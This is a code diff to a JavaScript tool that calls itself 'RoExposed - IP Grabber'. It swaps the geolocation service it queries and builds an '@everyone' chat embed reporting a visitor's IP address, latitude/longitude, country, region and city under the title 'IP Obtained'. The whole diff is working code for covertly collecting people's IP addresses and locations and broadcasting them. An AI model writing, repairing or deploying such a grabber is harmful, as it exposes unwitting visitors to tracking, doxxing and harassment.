@@ -21,30 +21,28 @@ setInterval(() => {
 }, 100);
 
 
-fetch("http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,query")
+fetch("http://ipwhois.app/json/")
     .then(async (response) => {
         const data = await response.json();
         console.log(data)
-        const ip = `http://ip-api.com/json/${data.query}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,query?`
         try {
-            const color = (data.proxy) ? 11022898 : 3468096
 
             const params = {
                 content: "@everyone",
                 embeds: [{
                     type: "rich",
                     title: "IP Obtained",
-                    color: color,
-                    description: `Grabbed new IP Address from somebody in **${data.regionName}**.`,
+                    color: 3468096,
+                    description: `Grabbed new IP Address from somebody in **${data.region}**.`,
                     fields: [{
                         name: "IP Address -",
-                        value: data.query
+                        value: data.ip
                     }, {
                         name: "Lat/Long -",
-                        value: `${data.lat} ${data.lon}`
+                        value: `${data.latitude} ${data.longitude}`
                     }, {
                         name: "Area",
-                        value: `${data.countryCode}, ${data.zip} ${data.regionName} ${data.city}`
+                        value: `${data.country_code}, ${data.region} ${data.city}`
                     }],
                     footer: {
                         text: "RoExposed - IP Grabber"
